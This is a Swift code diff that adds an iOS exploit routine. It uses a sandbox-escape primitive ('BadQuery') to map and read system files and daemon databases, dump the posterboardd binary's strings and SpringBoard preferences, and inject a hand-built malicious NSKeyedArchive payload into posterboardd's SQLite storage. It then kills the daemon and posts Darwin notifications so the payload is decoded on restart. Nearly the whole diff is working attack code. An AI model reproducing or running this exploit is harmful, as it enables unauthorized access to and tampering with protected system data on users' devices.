@@ -8,6 +8,7 @@
 import Foundation
 import SQLite3
 import Darwin
+import CoreFoundation
 
 class SymHandler {
     // MARK: URL Getter Operations
@@ -1058,5 +1059,395 @@ class SymHandler {
         let symURL = getSymlinkURL()
         // remove existing symlink
         try? FileManager.default.removeItem(at: symURL)
+    }
+
+    // MARK: - posterboardd Storage Probe
+
+    // NSKeyedArchive payload: PRSPosterConfiguration → PFPosterPath → NSURL
+    // Crafted so posterboardd's pf_secureDecodedFromData:classReplacementMap: decodes it.
+    // contentsURL = file:///private/var/mobile/Library/Preferences/com.apple.springboard.plist
+    static let posterboarddPayloadBase: Data = Data([
+        0x62,0x70,0x6c,0x69,0x73,0x74,0x30,0x30,0xd4,0x01,0x02,0x03,0x04,0x05,0x06,0x25,
+        0x28,0x59,0x24,0x61,0x72,0x63,0x68,0x69,0x76,0x65,0x72,0x58,0x24,0x6f,0x62,0x6a,
+        0x65,0x63,0x74,0x73,0x54,0x24,0x74,0x6f,0x70,0x58,0x24,0x76,0x65,0x72,0x73,0x69,
+        0x6f,0x6e,0x5f,0x10,0x0f,0x4e,0x53,0x4b,0x65,0x79,0x65,0x64,0x41,0x72,0x63,0x68,
+        0x69,0x76,0x65,0x72,0xa7,0x07,0x08,0x0d,0x13,0x19,0x1c,0x22,0x55,0x24,0x6e,0x75,
+        0x6c,0x6c,0xd2,0x09,0x0a,0x0b,0x0c,0x56,0x24,0x63,0x6c,0x61,0x73,0x73,0x51,0x70,
+        0x80,0x03,0x80,0x02,0xd3,0x09,0x0e,0x0f,0x10,0x11,0x12,0x51,0x63,0x51,0x72,0x80,
+        0x04,0x80,0x05,0x5b,0x6c,0x6f,0x63,0x6b,0x2d,0x73,0x63,0x72,0x65,0x65,0x6e,0xd2,
+        0x14,0x15,0x16,0x17,0x58,0x24,0x63,0x6c,0x61,0x73,0x73,0x65,0x73,0x5a,0x24,0x63,
+        0x6c,0x61,0x73,0x73,0x6e,0x61,0x6d,0x65,0xa2,0x17,0x18,0x5f,0x10,0x16,0x50,0x52,
+        0x53,0x50,0x6f,0x73,0x74,0x65,0x72,0x43,0x6f,0x6e,0x66,0x69,0x67,0x75,0x72,0x61,
+        0x74,0x69,0x6f,0x6e,0x58,0x4e,0x53,0x4f,0x62,0x6a,0x65,0x63,0x74,0xd2,0x14,0x15,
+        0x1a,0x1b,0xa2,0x1b,0x18,0x5c,0x50,0x46,0x50,0x6f,0x73,0x74,0x65,0x72,0x50,0x61,
+        0x74,0x68,0xd3,0x09,0x1d,0x1e,0x1f,0x20,0x21,0x57,0x4e,0x53,0x2e,0x62,0x61,0x73,
+        0x65,0x5b,0x4e,0x53,0x2e,0x72,0x65,0x6c,0x61,0x74,0x69,0x76,0x65,0x80,0x06,0x80,
+        0x00,0x5f,0x10,0x4a,0x66,0x69,0x6c,0x65,0x3a,0x2f,0x2f,0x2f,0x70,0x72,0x69,0x76,
+        0x61,0x74,0x65,0x2f,0x76,0x61,0x72,0x2f,0x6d,0x6f,0x62,0x69,0x6c,0x65,0x2f,0x4c,
+        0x69,0x62,0x72,0x61,0x72,0x79,0x2f,0x50,0x72,0x65,0x66,0x65,0x72,0x65,0x6e,0x63,
+        0x65,0x73,0x2f,0x63,0x6f,0x6d,0x2e,0x61,0x70,0x70,0x6c,0x65,0x2e,0x73,0x70,0x72,
+        0x69,0x6e,0x67,0x62,0x6f,0x61,0x72,0x64,0x2e,0x70,0x6c,0x69,0x73,0x74,0xd2,0x14,
+        0x15,0x23,0x24,0xa2,0x24,0x18,0x55,0x4e,0x53,0x55,0x52,0x4c,0xd1,0x26,0x27,0x54,
+        0x72,0x6f,0x6f,0x74,0x80,0x01,0x12,0x00,0x01,0x86,0xa0,0x00,0x08,0x00,0x11,0x00,
+        0x1b,0x00,0x24,0x00,0x29,0x00,0x32,0x00,0x44,0x00,0x4c,0x00,0x52,0x00,0x57,0x00,
+        0x5e,0x00,0x60,0x00,0x62,0x00,0x64,0x00,0x6b,0x00,0x6d,0x00,0x6f,0x00,0x71,0x00,
+        0x73,0x00,0x7f,0x00,0x84,0x00,0x8d,0x00,0x98,0x00,0x9b,0x00,0xb4,0x00,0xbd,0x00,
+        0xc2,0x00,0xc5,0x00,0xd2,0x00,0xd9,0x00,0xe1,0x00,0xed,0x00,0xef,0x00,0xf1,0x01,
+        0x3e,0x01,0x43,0x01,0x46,0x01,0x4c,0x01,0x4f,0x01,0x54,0x01,0x56,0x00,0x00,0x00,
+        0x00,0x00,0x00,0x02,0x01,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x29,0x00,0x00,0x00,
+        0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x01,0x5b
+    ])
+
+    /// Maps posterboardd's on-disk storage via bad_query, reads SQLite schemas,
+    /// extracts binary strings, and (if a suitable blob column is found) injects
+    /// the malicious NSKeyedArchive payload for posterboardd to decode on restart.
+    /// Saves full output to pp_posterboardd_diag.txt in LC Documents.
+    @discardableResult
+    static func probePosterboardd() -> String {
+        var diag: [String] = ["=== PosterboarddProbe \(Date()) iOS 26.5 ==="]
+        let fm = FileManager.default
+        let payload = posterboarddPayloadBase
+
+        // [0] bad_query sanity check
+        diag.append("[0] bad_query: \(BadQuery.isAvailable ? "AVAILABLE" : "FAIL – aborting")")
+        guard BadQuery.isAvailable else {
+            let out = diag.joined(separator: "\n")
+            try? out.write(to: getLCDocumentsDirectory().appendingPathComponent("pp_posterboardd_diag.txt"), atomically: true, encoding: .utf8)
+            return out
+        }
+
+        // [1] Enumerate /var/mobile/Library/ for poster/wallpaper/springboard dirs
+        diag.append("\n[1] /var/mobile/Library scan:")
+        if let h = try? BadQuery.consume(path: "/var/mobile/Library", create: true) {
+            defer { h.release() }
+            let items = (try? fm.contentsOfDirectory(atPath: "/var/mobile/Library")) ?? []
+            let interesting = items.filter {
+                let l = $0.lowercased()
+                return l.contains("poster") || l.contains("wallpaper") || l.contains("springboard")
+            }
+            diag.append("  found \(interesting.count) dirs: \(interesting.joined(separator: ", "))")
+            for item in interesting {
+                pbEnumDir("/var/mobile/Library/\(item)", depth: 0, maxDepth: 3, fm: fm, diag: &diag)
+            }
+        } else {
+            diag.append("  CONSUME FAIL on /var/mobile/Library")
+        }
+
+        // [2] Direct probe of known daemon storage paths (posterboardd is NOT an app container)
+        diag.append("\n[2] Daemon path probe:")
+        let daemonCandidates = [
+            "/var/mobile/Library/PosterBoard",
+            "/var/mobile/Library/posterboardd",
+            "/var/mobile/Library/com.apple.posterboardservices",
+            "/var/mobile/Library/com.apple.PosterBoardServices",
+            "/private/var/mobile/Library/PosterBoard",
+            "/var/db/posterboardd",
+        ]
+        for path in daemonCandidates {
+            guard let h = try? BadQuery.consume(path: path, create: true) else {
+                diag.append("  [NOACCESS] \(path)"); continue
+            }
+            defer { h.release() }
+            var isDir: ObjCBool = false
+            guard fm.fileExists(atPath: path, isDirectory: &isDir) else {
+                diag.append("  [MISSING]  \(path) (extension issued but path doesn't exist)"); continue
+            }
+            diag.append("  [OK] \(path)")
+            if isDir.boolValue {
+                pbEnumDir(path, depth: 0, maxDepth: 3, fm: fm, diag: &diag)
+            }
+        }
+
+        // [3] SQLite schema probe — try every .sqlite in found dirs + known names
+        diag.append("\n[3] SQLite probe:")
+        var sqlitePaths: [String] = []
+        // Any .sqlite3/.sqlite found by enumerating above paths
+        for base in ["/var/mobile/Library/PosterBoard", "/var/mobile/Library/posterboardd",
+                     "/var/mobile/Library/com.apple.posterboardservices"] {
+            if let h = try? BadQuery.consume(path: base, create: true) {
+                defer { h.release() }
+                let items = (try? fm.contentsOfDirectory(atPath: base)) ?? []
+                for item in items where item.hasSuffix(".sqlite") || item.hasSuffix(".sqlite3") || item.hasSuffix(".db") {
+                    sqlitePaths.append("\(base)/\(item)")
+                }
+            }
+        }
+        // Append known candidates not already covered
+        let knownSQL = [
+            "/var/mobile/Library/PosterBoard/com.apple.posterboard.sqlite",
+            "/var/mobile/Library/PosterBoard/PosterBoard.sqlite",
+            "/var/mobile/Library/PosterBoard/posterboardd.sqlite",
+        ]
+        for p in knownSQL where !sqlitePaths.contains(p) { sqlitePaths.append(p) }
+
+        for sqlPath in sqlitePaths {
+            pbProbeSQLite(path: sqlPath, payload: payload, fm: fm, diag: &diag)
+        }
+
+        // [4] posterboardd binary strings (decode/import/archive/sqlite/notify/xpc)
+        diag.append("\n[4] posterboardd binary:")
+        pbReadBinaryStrings(fm: fm, diag: &diag)
+
+        // [5] SpringBoard entitlements plist (if accessible)
+        diag.append("\n[5] SpringBoard prefs/entitlements:")
+        for p in ["/var/mobile/Library/Preferences/com.apple.springboard.plist"] {
+            guard let h = try? BadQuery.consume(path: p, create: true) else {
+                diag.append("  \(p): CONSUME FAIL"); continue
+            }
+            defer { h.release() }
+            if let data = fm.contents(atPath: p),
+               let pl = try? PropertyListSerialization.propertyList(from: data, options: [], format: nil) {
+                let desc = String(describing: pl).prefix(800)
+                diag.append("  \(p): \(desc)")
+            } else {
+                diag.append("  \(p): read ok but empty/unreadable plist")
+            }
+        }
+
+        // [6] Darwin notification names in posterboardd binary (for triggering reload)
+        // (already covered in [4] — explicitly filter com.apple.* strings here)
+        diag.append("\n[6] Kill posterboardd (SIGTERM) and Darwin notifs:")
+        var pbdPid: pid_t = -1
+        var mib: [Int32] = [CTL_KERN, KERN_PROC, KERN_PROC_ALL, 0]
+        var procSize = 0
+        sysctl(&mib, u_int(mib.count), nil, &procSize, nil, 0)
+        if procSize > 0 {
+            let count = procSize / MemoryLayout<kinfo_proc>.stride
+            var procs = [kinfo_proc](repeating: kinfo_proc(), count: count)
+            sysctl(&mib, u_int(mib.count), &procs, &procSize, nil, 0)
+            for p in procs {
+                let name = withUnsafePointer(to: p.kp_proc.p_comm) {
+                    String(cString: UnsafeRawPointer($0).assumingMemoryBound(to: CChar.self))
+                }
+                if name == "posterboardd" || name.hasPrefix("posterboard") {
+                    pbdPid = p.kp_proc.p_pid
+                    diag.append("  posterboardd pid=\(pbdPid) name=\(name)")
+                    break
+                }
+            }
+        }
+        if pbdPid > 0 {
+            let r = Darwin.kill(pbdPid, SIGTERM)
+            diag.append("  SIGTERM rc=\(r) errno=\(Darwin.errno)")
+        } else {
+            diag.append("  posterboardd process not found in process list")
+        }
+
+        let center = CFNotificationCenterGetDarwinNotifyCenter()
+        let notifNames = [
+            "com.apple.springboard.posterboard.wallpapersDidChange",
+            "com.apple.posterboard.newPosterAvailable",
+            "com.apple.posterboardd.posterDataChanged",
+            "com.apple.posterboard.reload",
+            "PRBPosterExtensionDataStoreChanged",
+        ]
+        for n in notifNames {
+            CFNotificationCenterPostNotification(center, CFNotificationName(n as CFString), nil, nil, true)
+        }
+        diag.append("  posted \(notifNames.count) Darwin notif candidates")
+
+        let out = diag.joined(separator: "\n")
+        let diagURL = getLCDocumentsDirectory().appendingPathComponent("pp_posterboardd_diag.txt")
+        try? out.write(to: diagURL, atomically: true, encoding: .utf8)
+        print("[PosterboarddProbe] saved → \(diagURL.path)")
+        return out
+    }
+
+    // MARK: - Probe helpers (private)
+
+    private static func pbEnumDir(_ path: String, depth: Int, maxDepth: Int,
+                                   fm: FileManager, diag: inout [String]) {
+        guard depth < maxDepth else { return }
+        guard let h = try? BadQuery.consume(path: path, create: true) else { return }
+        defer { h.release() }
+        let indent = String(repeating: "  ", count: depth + 2)
+        let items = (try? fm.contentsOfDirectory(atPath: path)) ?? []
+        for item in items where !item.hasPrefix(".") {
+            let sub = "\(path)/\(item)"
+            var isDir: ObjCBool = false
+            fm.fileExists(atPath: sub, isDirectory: &isDir)
+            if isDir.boolValue {
+                let subItems = (try? fm.contentsOfDirectory(atPath: sub)) ?? []
+                diag.append("\(indent)\(item)/ [\(subItems.count)]")
+                pbEnumDir(sub, depth: depth + 1, maxDepth: maxDepth, fm: fm, diag: &diag)
+            } else {
+                let size = (try? fm.attributesOfItem(atPath: sub))?[.size] as? Int ?? 0
+                diag.append("\(indent)\(item) \(size)b")
+            }
+        }
+    }
+
+    private static func pbProbeSQLite(path: String, payload: Data,
+                                       fm: FileManager, diag: inout [String]) {
+        guard let h = try? BadQuery.consume(path: path, create: true) else {
+            diag.append("  \(path): CONSUME FAIL"); return
+        }
+        defer { h.release() }
+        guard fm.fileExists(atPath: path) else {
+            diag.append("  \(path): not found"); return
+        }
+        let size = (try? fm.attributesOfItem(atPath: path))?[.size] as? Int ?? 0
+        diag.append("  FOUND: \((path as NSString).lastPathComponent) (\(size)b)")
+
+        // Verify SQLite magic
+        if let data = fm.contents(atPath: path), data.count >= 16 {
+            let magic = String(data: data.prefix(6), encoding: .ascii) ?? ""
+            diag.append("    magic: '\(magic)' isSQL=\(magic == "SQLite")")
+        }
+
+        var db: OpaquePointer?
+        let rwRc = sqlite3_open_v2(path, &db, SQLITE_OPEN_READWRITE, nil)
+        if rwRc != SQLITE_OK {
+            // sqlite3_open_v2 always sets db even on failure — close it
+            if let badDb = db { sqlite3_close(badDb); db = nil }
+            var rodb: OpaquePointer?
+            let rc2 = sqlite3_open_v2(path, &rodb, SQLITE_OPEN_READONLY, nil)
+            if rc2 == SQLITE_OK, let rodb = rodb {
+                diag.append("    opened READ-ONLY (write denied)")
+                pbDumpSchema(db: rodb, diag: &diag)
+                sqlite3_close(rodb)
+            } else {
+                diag.append("    open FAIL (both RW and RO)")
+                if let rodb = rodb { sqlite3_close(rodb) }
+            }
+            return
+        }
+        guard let db = db else {
+            diag.append("    open FAIL (nil handle)"); return
+        }
+        diag.append("    opened READ-WRITE")
+        sqlite3_busy_timeout(db, 2000)
+        pbDumpSchema(db: db, payload: payload, diag: &diag)
+        sqlite3_close(db)
+    }
+
+    private static func pbDumpSchema(db: OpaquePointer, payload: Data? = nil,
+                                      diag: inout [String]) {
+        var stmt: OpaquePointer?
+        // List tables and their DDL
+        if sqlite3_prepare_v2(db, "SELECT name,sql FROM sqlite_master WHERE type='table'", -1, &stmt, nil) == SQLITE_OK {
+            while sqlite3_step(stmt) == SQLITE_ROW {
+                let tname = String(cString: sqlite3_column_text(stmt, 0))
+                let tsql  = String(cString: sqlite3_column_text(stmt, 1))
+                diag.append("    TABLE \(tname): \(tsql)")
+            }
+        }
+        sqlite3_finalize(stmt); stmt = nil
+
+        // For each table: row count + first 3 rows
+        if sqlite3_prepare_v2(db, "SELECT name FROM sqlite_master WHERE type='table'", -1, &stmt, nil) == SQLITE_OK {
+            while sqlite3_step(stmt) == SQLITE_ROW {
+                let tname = String(cString: sqlite3_column_text(stmt, 0))
+                var cntStmt: OpaquePointer?
+                var cnt: Int64 = 0
+                if sqlite3_prepare_v2(db, "SELECT COUNT(*) FROM \"\(tname)\"", -1, &cntStmt, nil) == SQLITE_OK,
+                   sqlite3_step(cntStmt) == SQLITE_ROW {
+                    cnt = sqlite3_column_int64(cntStmt, 0)
+                }
+                sqlite3_finalize(cntStmt)
+                diag.append("    \(tname): \(cnt) rows")
+
+                // Dump first 5 rows
+                var rowStmt: OpaquePointer?
+                if sqlite3_prepare_v2(db, "SELECT * FROM \"\(tname)\" LIMIT 5", -1, &rowStmt, nil) == SQLITE_OK {
+                    let colCount = sqlite3_column_count(rowStmt)
+                    var blobColIdx: Int32 = -1
+                    while sqlite3_step(rowStmt) == SQLITE_ROW {
+                        var parts: [String] = []
+                        for i in 0..<colCount {
+                            let col = String(cString: sqlite3_column_name(rowStmt, i))
+                            switch sqlite3_column_type(rowStmt, i) {
+                            case SQLITE_TEXT:
+                                let v = String(cString: sqlite3_column_text(rowStmt, i))
+                                parts.append("\(col)='\(v.prefix(60))'")
+                            case SQLITE_INTEGER:
+                                parts.append("\(col)=\(sqlite3_column_int64(rowStmt, i))")
+                            case SQLITE_BLOB:
+                                let sz = sqlite3_column_bytes(rowStmt, i)
+                                var tag = "[blob \(sz)b]"
+                                if sz >= 6, let ptr = sqlite3_column_blob(rowStmt, i) {
+                                    let hdr = Data(bytes: ptr, count: min(8, sz))
+                                    let hdrHex = hdr.map { String(format: "%02x", $0) }.joined()
+                                    tag += " hdr=\(hdrHex)"
+                                    if String(data: hdr.prefix(6), encoding: .ascii) == "bplist" {
+                                        tag += " *** NSKeyedArchive ***"
+                                        blobColIdx = i
+                                    }
+                                }
+                                parts.append("\(col)=\(tag)")
+                            case SQLITE_NULL:
+                                parts.append("\(col)=NULL")
+                            default:
+                                parts.append("\(col)=?")
+                            }
+                        }
+                        diag.append("      row: \(parts.joined(separator: " | "))")
+                    }
+                    sqlite3_finalize(rowStmt)
+
+                    // If we found a NSKeyedArchive blob column AND we have a payload, try injecting
+                    if let payload = payload, blobColIdx >= 0 {
+                        var colNameStmt: OpaquePointer?
+                        if sqlite3_prepare_v2(db, "SELECT * FROM \"\(tname)\" LIMIT 1", -1, &colNameStmt, nil) == SQLITE_OK,
+                           sqlite3_step(colNameStmt) == SQLITE_ROW {
+                            let blobCol = String(cString: sqlite3_column_name(colNameStmt, blobColIdx))
+                            diag.append("    *** NSKeyedArchive blob in \(tname).\(blobCol) — attempting injection ***")
+                            let injectSQL = "UPDATE \"\(tname)\" SET \"\(blobCol)\" = ? WHERE rowid = (SELECT rowid FROM \"\(tname)\" LIMIT 1)"
+                            var injectStmt: OpaquePointer?
+                            if sqlite3_prepare_v2(db, injectSQL, -1, &injectStmt, nil) == SQLITE_OK {
+                                payload.withUnsafeBytes { buf in
+                                    sqlite3_bind_blob(injectStmt, 1, buf.baseAddress, Int32(payload.count), SQLITE_TRANSIENT)
+                                }
+                                let rc = sqlite3_step(injectStmt)
+                                let affected = sqlite3_changes(db)
+                                diag.append("    inject rc=\(rc) rows_affected=\(affected)")
+                                if rc == SQLITE_DONE && affected > 0 {
+                                    diag.append("    INJECTION SUCCESS — restart posterboardd to trigger decode")
+                                }
+                            }
+                            sqlite3_finalize(injectStmt)
+                        }
+                        sqlite3_finalize(colNameStmt)
+                    }
+                }
+            }
+        }
+        sqlite3_finalize(stmt)
+    }
+
+    private static func pbReadBinaryStrings(fm: FileManager, diag: inout [String]) {
+        for binPath in ["/usr/libexec/posterboardd", "/usr/sbin/posterboardd",
+                        "/usr/libexec/posterboardd.development"] {
+            guard let bh = try? BadQuery.consume(path: binPath, create: true) else {
+                diag.append("  \(binPath): CONSUME FAIL"); continue
+            }
+            defer { bh.release() }
+            guard let data = fm.contents(atPath: binPath), data.count > 0 else {
+                diag.append("  \(binPath): read FAIL"); continue
+            }
+            diag.append("  \(binPath): \(data.count) bytes")
+
+            var cur: [UInt8] = []; var extracted: [String] = []
+            for byte in data {
+                if byte >= 32 && byte < 127 { cur.append(byte) }
+                else {
+                    if cur.count >= 8, let s = String(bytes: cur, encoding: .ascii) {
+                        let l = s.lowercased()
+                        if l.contains("import") || l.contains("archive") || l.contains("decode") ||
+                           l.contains("sqlite") || l.contains("posterboard") || l.contains("wallpaper") ||
+                           l.contains("darwin") || l.contains("notify") || l.contains("mutat") ||
+                           l.contains("xpc") || l.contains("entitlement") ||
+                           (s.hasPrefix("com.apple.") && s.count > 15) ||
+                           s.hasPrefix("/var/") || s.hasPrefix("/Library/") {
+                            extracted.append(s)
+                        }
+                    }
+                    cur.removeAll(keepingCapacity: true)
+                }
+            }
+            diag.append("  strings[\(extracted.count)]:")
+            for s in extracted.prefix(500) { diag.append("    \(s)") }
+            break  // only need one binary
+        }
     }
 }
